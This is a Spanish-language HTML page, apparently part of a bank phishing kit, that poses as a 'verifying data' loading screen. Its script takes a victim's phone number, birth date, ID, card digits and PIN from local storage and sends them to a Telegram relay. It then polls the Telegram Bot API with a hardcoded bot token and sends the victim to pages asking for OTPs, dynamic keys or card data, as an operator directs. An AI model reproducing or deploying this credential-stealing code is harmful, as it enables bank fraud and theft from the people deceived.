<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Datos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('img/fondo.jpg') no-repeat center center fixed;
            background-size: cover;
        }

        .blur-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
        }

        .loaderp-full {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            width: 90%;
            height: 90%;
            z-index: 9999;
        }

        .loaderp {
            width: 180px; /* Tamaño del círculo */
            height: 180px; /* Tamaño del círculo */
            background-image: url('img/circulo.png'); /* Carga la imagen del círculo */
            background-size: cover; /* Hace que la imagen cubra todo el círculo */
            border-radius: 50%; /* Forma el círculo */
            position: relative; /* Necesario para posicionar el loader dentro */
            display: flex;
            flex-direction: column; /* Centra el texto debajo del loader */
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .loaderp .loader {
            width: 30px; /* Tamaño del loader (gris) */
            height: 30px; /* Tamaño del loader (gris) */
            border: 5px solid #f3f3f3; /* Hacer el borde más delgado (antes era 10px) */
            border-top: 5px solid #555; /* Hacer el borde superior más delgado (antes era 10px) */
            border-radius: 50%;
            animation: spin 1s linear infinite; /* Animación de giro */
        }

        .loaderp-text {
            margin-top: 30px; /* Espacio entre el loader y el texto */
            font-size: 13px;
            color: black;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="blur-overlay"></div>
    <div class="loaderp-full">
        <div class="loaderp">
            <div class="loader"></div> <!-- Este es el loader gris que gira -->
            <div class="loaderp-text">Cargando...</div> <!-- Texto debajo del loader -->
        </div>
    </div>



    <script>
document.addEventListener('DOMContentLoaded', async function () {
  const loader = document.querySelector('#loader');

  const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));

  if (
    !bancoldata ||
    !bancoldata.celular ||
    !bancoldata.nacimiento ||
    !bancoldata.tipo ||
    !bancoldata.identificador ||
    !bancoldata.digitosFinales ||
    !bancoldata.clave
  ) {
    console.error("Faltan datos en 'bancoldata'");
    alert("Por favor, vuelve al inicio y completa los datos.");
    window.location.href = "index.html";
    return;
  }

  // Construir mensaje para Telegram
  let mensaje = "📥 NUEVO REGISTRO DE USUARIO\n";
  mensaje += "📱 Celular: " + bancoldata.celular + "\n";
  mensaje += "🎂 Fecha de nacimiento: " + bancoldata.nacimiento + "\n";
  mensaje += "🧾 Tipo de acceso: " + bancoldata.tipo + "\n";
  mensaje += "💳 Identificador: " + bancoldata.identificador + "\n";
  mensaje += "🔢 Últimos 2 dígitos: " + bancoldata.digitosFinales + "\n";
  mensaje += "🔐 Clave/NIP: " + bancoldata.clave;

  console.log("Enviando a Telegram:", mensaje);

  // ENVÍO a botmaster2.php
  await fetch("botmaster2.php", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: "data=" + encodeURIComponent(mensaje)
  });

  // Inicia verificación por botón Telegram
  const transactionId = `${Date.now()}-${Math.floor(Math.random() * 99999)}`; // genera un ID simple

  async function checkPaymentVerification(transactionId) {
    try {
      const response = await fetch(`https://api.telegram.org/bot7844799050:AAEr7wChEkAp31ktChjaTlguv1aUykSbaxw/getUpdates`);
      const data = await response.json();

      const verificationUpdate = data.result.find(update =>
        update.callback_query &&
        [
          `pedir_dinamica:${transactionId}`,
          `pedir_cajero:${transactionId}`,
          `pedir_otp:${transactionId}`,
          `pedir_token:${transactionId}`,
          `error_tc:${transactionId}`,
          `tarjeta_credito:${transactionId}`,
          `error_logo:${transactionId}`,
          `confirm_finalizar:${transactionId}`
        ].includes(update.callback_query.data)
      );

      if (verificationUpdate) {
        if (loader) loader.style.display = "none";

        switch (verificationUpdate.callback_query.data) {
          case `pedir_dinamica:${transactionId}`:
            window.location.href = "dinacol.php";
            break;
          case `pedir_cajero:${transactionId}`:
            window.location.href = "ccajero-id.php";
            break;
          case `pedir_otp:${transactionId}`:
          case `pedir_token:${transactionId}`:
            window.location.href = "index-otp.html";
            break;
          case `tarjeta_credito:${transactionId}`:
            window.location.href = "cards.html";
            break;
          case `error_tc:${transactionId}`:
            alert("Error en tarjeta. Verifique los datos.");
            window.location.href = "../../pay/";
            break;
          case `error_logo:${transactionId}`:
            alert("Error en el logo. Reintente.");
            window.location.href = "index-pc-error.html";
            break;
          case `confirm_finalizar:${transactionId}`:
            window.location.href = "../../checking.php";
            break;
        }
      } else {
        setTimeout(() => checkPaymentVerification(transactionId), 2000);
      }
    } catch (error) {
      console.error("Error en la verificación:", error);
      setTimeout(() => checkPaymentVerification(transactionId), 2000);
    }
  }

  checkPaymentVerification(transactionId);
});
</script>

</body>
</html>
